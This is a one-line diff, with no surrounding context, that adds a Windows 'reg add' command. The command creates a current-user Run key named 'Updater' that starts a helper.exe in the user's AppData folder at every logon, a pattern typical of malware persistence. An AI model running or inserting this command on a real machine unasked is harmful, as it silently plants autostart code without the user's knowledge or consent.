@@ -1,1 +1,1 @@
-
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Users\max\AppData\Roaming\helper.exe" /f
